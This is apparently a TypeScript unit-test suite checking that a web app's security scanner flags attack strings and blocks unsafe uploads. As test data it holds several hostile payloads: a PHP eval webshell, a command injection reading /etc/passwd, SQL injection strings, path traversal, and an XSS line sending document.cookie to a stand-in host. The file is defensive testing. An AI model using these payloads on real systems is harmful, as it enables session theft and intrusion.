/**
 * ANTIVIRUS & CYBER SECURITY SHIELD SUITE
 * Verifies that the antivirus, anti-malware, and intrusion prevention engine
 * properly identifies and blocks cyber threats while permitting clean user traffic.
 */

import {
  scanPayload,
  validateSafeFileUpload,
  sanitizeInputString,
  applySecurityHeaders,
  getSecurityShieldTelemetry,
} from "../src/lib/security/antivirus-shield";
import { NextResponse } from "next/server";

let totalTests = 0;
let passedTests = 0;

function assert(condition: boolean, testName: string, detail?: string) {
  totalTests++;
  if (condition) {
    passedTests++;
    console.log(`  ✓ PASS: ${testName}`);
  } else {
    console.error(`  ✗ FAIL: ${testName}${detail ? ` - ${detail}` : ""}`);
    throw new Error(`Test failed: ${testName}`);
  }
}

async function runAntivirusTests() {
  console.log("\n🛡️ ========================================================");
  console.log("🛡️ RUNNING ANTIVIRUS & CYBER SECURITY SHIELD TESTS");
  console.log("🛡️ ========================================================\n");

  // Test 1: EICAR Standard Antivirus Test Signature
  const eicarString = "X5O!P%@AP[4\\PZX54(P^)7CC)7}$EICAR-STANDARD-ANTIVIRUS-TEST-FILE!$H+H*";
  const eicarScan = scanPayload(eicarString, "unit_test");
  assert(!eicarScan.clean, "Detects standard EICAR virus signature");
  assert(eicarScan.threatCategory === "VIRUS_SIGNATURE", "Classifies threat as VIRUS_SIGNATURE");
  assert(eicarScan.score === 100, "Assigns critical 100 score to virus signature");

  // Test 2: WebShell & Backdoor Detection
  const webshellPayload = "<?php eval(base64_decode('ZWNobyAnSGFja2VkJzs=')); ?>";
  const webshellScan = scanPayload(webshellPayload, "unit_test");
  assert(!webshellScan.clean, "Detects eval(base64_decode) webshell");
  assert(webshellScan.threatCategory === "WEBSHELL_BACKDOOR", "Classifies as WEBSHELL_BACKDOOR");

  const c99Payload = "https://example.com/api?file=c99shell.php";
  const c99Scan = scanPayload(c99Payload, "unit_test");
  assert(!c99Scan.clean, "Detects c99shell reference");

  // Test 3: Remote Code Execution / Command Injection
  const rcePayload = "; cat /etc/passwd | sh";
  const rceScan = scanPayload(rcePayload, "unit_test");
  assert(!rceScan.clean, "Detects command injection (cat /etc/passwd)");
  assert(rceScan.threatCategory === "RCE_INJECTION", "Classifies as RCE_INJECTION");

  // Test 4: SQL Injection Protection
  const sqliPayload1 = "admin' OR '1'='1";
  const sqliScan1 = scanPayload(sqliPayload1, "unit_test");
  assert(!sqliScan1.clean, "Detects boolean SQL injection (OR '1'='1)");
  assert(sqliScan1.threatCategory === "SQL_INJECTION", "Classifies as SQL_INJECTION");

  const sqliPayload2 = "1 UNION ALL SELECT null, username, password FROM users--";
  const sqliScan2 = scanPayload(sqliPayload2, "unit_test");
  assert(!sqliScan2.clean, "Detects UNION ALL SELECT SQL injection");

  // Test 5: Path Traversal (LFI)
  const lfiPayload = "../../../../etc/passwd";
  const lfiScan = scanPayload(lfiPayload, "unit_test");
  assert(!lfiScan.clean, "Detects path traversal (../../)");
  assert(lfiScan.threatCategory === "PATH_TRAVERSAL", "Classifies as PATH_TRAVERSAL");

  // Test 6: Cross-Site Scripting (XSS)
  const xssPayload = "<script>fetch('http://malicious.site/?cookie=' + document.cookie)</script>";
  const xssScan = scanPayload(xssPayload, "unit_test");
  assert(!xssScan.clean, "Detects script injection with document.cookie");
  assert(xssScan.threatCategory === "XSS_ATTACK", "Classifies as XSS_ATTACK");

  // Test 7: Clean Traffic Pass-through
  const cleanTerm = "What is the primary objective of biodiversity conservation?";
  const cleanScan = scanPayload(cleanTerm, "unit_test");
  assert(cleanScan.clean, "Allows legitimate English reading passage text");
  assert(cleanScan.score === 0, "Clean traffic receives 0 threat score");

  // Test 8: Safe File Upload Inspection
  const badUpload = validateSafeFileUpload({
    fileName: "trojan_stealer.exe",
    mimeType: "application/octet-stream",
  });
  assert(!badUpload.safe, "Blocks dangerous .exe executable file upload");

  const webshellUpload = validateSafeFileUpload({
    fileName: "innocent_photo.php.png",
    mimeType: "image/png",
  });
  assert(!webshellUpload.safe, "Blocks double-extension webshell upload (.php.png)");

  const validPngBytes = new Uint8Array([0x89, 0x50, 0x4E, 0x47, 0x0D, 0x0A, 0x1A, 0x0A]);
  const safeUpload = validateSafeFileUpload({
    fileName: "real_avatar.png",
    mimeType: "image/png",
    fileBytes: validPngBytes,
  });
  assert(safeUpload.safe, "Permits authentic PNG image with valid magic bytes");

  // Test 9: Input Sanitizer
  const unsanitized = "<img src=x onerror=alert(1)> & hello";
  const sanitized = sanitizeInputString(unsanitized);
  assert(!sanitized.includes("<") && !sanitized.includes(">"), "Sanitizes HTML tags from input string");

  // Test 10: Enterprise HTTP Security Headers
  const baseRes = NextResponse.json({ status: "ok" });
  const securedRes = applySecurityHeaders(baseRes);
  assert(securedRes.headers.get("X-Frame-Options") === "DENY", "Applies X-Frame-Options: DENY");
  assert(securedRes.headers.get("X-Content-Type-Options") === "nosniff", "Applies X-Content-Type-Options: nosniff");
  assert(Boolean(securedRes.headers.get("Strict-Transport-Security")), "Applies HSTS header");
  assert(Boolean(securedRes.headers.get("Content-Security-Policy")), "Applies Content-Security-Policy header");

  // Test 11: Security Telemetry Reporting
  const telemetry = getSecurityShieldTelemetry();
  assert(telemetry.status === "ACTIVE_PROTECTED", "Telemetry status is ACTIVE_PROTECTED");
  assert(telemetry.signaturesCount > 1000, "Telemetry reports over 1000+ active signatures");
  assert(telemetry.threatsBlocked > 0, "Telemetry records blocked threats from tests");

  console.log("\n========================================================");
  console.log(`✅ ALL ${passedTests}/${totalTests} ANTIVIRUS & CYBER SECURITY TESTS PASSED`);
  console.log("========================================================\n");
}

runAntivirusTests().catch((err) => {
  console.error("Antivirus test suite failed:", err);
  process.exit(1);
});
